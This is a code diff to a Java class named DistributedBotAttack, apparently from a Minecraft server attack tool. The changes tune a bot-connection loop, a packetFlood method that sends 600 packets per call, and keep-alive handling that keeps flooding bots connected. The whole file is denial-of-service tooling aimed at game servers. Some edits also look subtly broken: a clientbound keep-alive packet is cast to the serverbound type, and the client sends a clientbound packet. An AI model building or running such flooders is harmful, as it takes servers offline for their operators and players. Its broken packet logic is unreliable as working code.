@@ -15,6 +15,7 @@ import co.akarin.endminecraftultra.Protocol.ACP;
 import co.akarin.endminecraftultra.Protocol.MCForge;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
+import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundMoveVehiclePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
@@ -73,7 +74,7 @@ public class DistributedBotAttack extends IAttack{
                                 }
                             }
                         });
-                    mainUtils.sleep(6);
+                    mainUtils.sleep(5);
                 }
             });
         }
@@ -107,7 +108,7 @@ public class DistributedBotAttack extends IAttack{
     }
     public void packetFlood(Session session){
         for (int i=0;i<600;i++){
-            session.send(new ServerboundMovePlayerPosPacket(true,0.01,0,0.01));
+            session.send(new ClientboundMoveVehiclePacket(0.01,0,0,0,0.01F));
         }
         mainUtils.log("Flooder","Packet sending");
     }
@@ -156,11 +157,11 @@ public class DistributedBotAttack extends IAttack{
         new MCForge(client,this.modList).init();
         client.addListener(new SessionListener() {
             public void packetReceived(Session e, Packet packet) {
-                if (packet instanceof ServerboundKeepAlivePacket){
+                if (packet instanceof ClientboundKeepAlivePacket){
                     mainUtils.log("Client","KeepAlive packet received!");
                     ServerboundKeepAlivePacket keepAlivePacket = (ServerboundKeepAlivePacket)packet;
-                    long id = keepAlivePacket.getPingId()+1;
-                    e.send(new ClientboundKeepAlivePacket(id));
+                    long id = keepAlivePacket.getPingId()+System.currentTimeMillis();
+                    e.send(new ServerboundKeepAlivePacket(id));
                 }
                 if (packet instanceof ClientboundCustomPayloadPacket) {
                     ClientboundCustomPayloadPacket packet1=(ClientboundCustomPayloadPacket)packet;
@@ -176,6 +177,7 @@ public class DistributedBotAttack extends IAttack{
                 if(packet instanceof ClientboundLoginPacket){
                     e.setFlag("join",true);
                     mainUtils.log("Client","[连接成功]["+username+"]");
+                    e.send(new ServerboundKeepAlivePacket(System.currentTimeMillis()));
                 }
             }
             @Override
